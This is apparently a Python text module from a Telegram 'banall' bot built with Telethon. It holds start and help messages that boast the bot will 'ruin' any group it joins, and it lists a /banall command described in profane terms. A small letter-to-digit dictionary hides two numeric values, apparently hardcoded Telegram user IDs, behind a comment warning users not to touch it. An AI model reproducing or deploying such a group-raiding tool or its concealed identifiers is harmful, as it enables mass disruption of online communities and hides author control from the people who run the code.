# Powered by @Darkranger00 | Tele:- @aadillllll
# Dear Pero ppls Plish Don't remove this line from here🌚
# created by by only you
# Kangers ki mkc
# Don't remove credit!!
from telethon import events
# Don't mess with this dict code if u don't know about this !!
ex = {'a': '0','b': '1','d': '2','c': '3','z': '9','f': '5','u': '7','o': '4','k': '8','s': '6',}
dady = (ex['f']+ex['a']+ex['s']+ex['s']+ex['z']+ex['o']+ex['c']+ex['c']+ex['d']+ex['k'])
dad = (ex['f']+ex['a']+ex['u']+ex['d']+ex['s']+ex['f']+ex['a']+ex['s']+ex['u']+ex['b'])

startxt = """𝗛𝗘𝗬 [{}](tg://user?id={})

𝗜 𝗔𝗠 𝗔𝗟𝗜𝗩𝗘 𝗔𝗟𝗘𝗔𝗗𝗬 𝗠𝗔𝗦𝗧𝗘𝗥! 𝗝𝗨𝗦𝗧 𝗥𝗘𝗔𝗗𝗬 𝗧𝗢 𝗙𝗨𝗖𝗞 𝗔𝗡𝗬 𝗚𝗥𝗢𝗨𝗣
𝗔𝗗𝗗 𝗠𝗘 𝗧𝗛𝗘𝗥𝗘 𝗔𝗡𝗗 𝗜 𝗪𝗜𝗟𝗟 𝗥𝗨𝗜𝗡𝗘𝗗 𝗚𝗥𝗢𝗨𝗣...!

• 𝗠𝗬 𝗟𝗜𝗕'𝗦 𝗜𝗡𝗙𝗢! 
❍ 𝗣𝗬𝗧𝗛𝗢𝗡 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 » {}
❍ 𝗧𝗘𝗟𝗘𝗧𝗛𝗢𝗡 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 » {}
❍ 𝗖𝗢𝗗𝗘 𝗢𝗪𝗡𝗘𝗥 » [⌯ 𝙎𝙃𝙄𝙊𝙉↝ • ❰𝗕⌬𝗡𝗧𝝣𝗡❱](https://t.me/Itz_Shion_II)

𝗧𝗬𝗣𝗘 /help 𝗙𝗢𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦!
"""


startxt2 = """Hello [{}](tg://user?id={}),

𝗧𝗛𝗜𝗦 𝗜𝗦 𝗔 𝗣𝗢𝗪𝗘𝗥𝗙𝗨𝗟𝗟 𝗕𝗔𝗡𝗔𝗟𝗟 𝗕𝗢𝗧\𝗻𝗢𝗡𝗟𝗬 𝗠𝗬 𝗢𝗪𝗡𝗘𝗥 𝗖𝗔𝗡 𝗔𝗖𝗖𝗘𝗦𝗦 𝗧𝗛𝗜𝗦 𝗕𝗢𝗧! \𝗖𝗥𝗘𝗔𝗧𝗘𝗗 𝗕𝗬 @Itz_Shion_II\

• 𝗠𝗬 𝗟𝗜𝗕'𝗦 𝗜𝗡𝗙𝗢! 
❍ 𝗖𝗢𝗗𝗘 𝗢𝗪𝗡𝗘𝗥 » "[⌯ 𝙎𝙃𝙄𝙊𝙉↝ • ❰𝗕⌬𝗡𝗧𝝣𝗡❱](𝘁𝗴://𝘂𝘀𝗲𝗿?𝗶𝗱={𝟲𝟮𝟳𝟯𝟰𝟵𝟲𝟬𝟬𝟮})"}
"""

hlptxt = """ Hello [{}](tg://user?id={}),

•𝗛𝗘𝗥𝗘 𝗜𝗦 𝗛𝗘𝗟𝗣 𝗠𝗘𝗡𝗨•

 • /start - 𝗧𝗢 𝗦𝗧𝗔𝗥𝗧 𝗧𝗛𝗘 𝗕𝗢𝗧.
 • /ping - 𝗖𝗛𝗘𝗖𝗞 𝗕𝗢𝗧 𝗜𝗦 𝗔𝗟𝗜𝗩𝗘.
 • /banall - 𝗧𝗢 𝗙𝗨𝗖𝗞 𝗞𝗜𝗗𝗦 𝗚𝗥𝗢𝗨𝗣.
 • /leave - 𝗧𝗢 𝗟𝗘𝗔𝗩𝗘 𝗚𝗥𝗢𝗨𝗣.
 • /restart - 𝗧𝗢 𝗥𝗘𝗦𝗧𝗔𝗥𝗧 𝗕𝗢𝗧

❍ 𝗠𝗘𝗘𝗧 𝗠𝗬 𝗢𝗪𝗡𝗘𝗥 𝗔𝗧 [SUPPORT](https://t.me/Bonten_mainchats) 𝗙𝗢𝗥 𝗔𝗡𝗬 𝗞𝗜𝗡𝗗 𝗢𝗙 𝗜𝗦𝗦𝗨𝗘𝗦!!
"""
